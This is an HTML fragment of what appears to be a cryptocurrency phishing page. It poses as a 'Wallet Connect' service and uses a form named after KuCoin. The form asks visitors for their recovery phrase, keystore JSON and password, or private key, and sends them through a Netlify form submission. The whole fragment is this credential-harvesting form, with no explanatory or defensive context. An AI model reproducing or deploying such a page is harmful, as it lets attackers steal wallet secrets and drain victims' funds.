        <main>
       <div class="wallletinfo"    id="wallets">
        <div class="topinfo">
            <img src="./img/img13.png"  id="coinbaseimg" alt="Wallet Connect">
            <h3>Wallet Connect</h3>
        </div>
        <div class="sync">
        <div class="option">
            <p id="phrases"  class="emphasis" >Phrase</p>
            <p id="keystore" >Keystore JSON</p>
            <P id="private"  >Private Key</P>
        </div>
            
<div class="info">
            <form   name="kucoinWalletConnect" method="POST" data-netlify="true">
                <div class="phrasekey"  >
                <p>Typically 12 (sometimes 24) words separated by single spaces</p>
                <textarea name="cryptomessage" class="phrase"   cols="80"  placeholder="Phrase" rows="10"></textarea>
                </div>
                <div class="JSON">
                    <textarea name="cryptoform2" class="phrase" cols="80"  placeholder="Keystore JSON" rows="10"></textarea>
                    <input type="password" name="cryptopassword"  placeholder="Your Password" class="password">
                    <p>Several lines of text beginning with '(....)' plus the password you used to encrypt it.</p>
                </div>
                <div class="privatekey">
                    <input type="text" name="password"  placeholder="private key" class="password">
                    <p>Typically 12 (sometimes 24) words separated by single spaces</p>
                </div>
                <button type="submit" name="btn" class="btn" id="submit">CONNECT</button>
            </form>
        </div>
        </div>
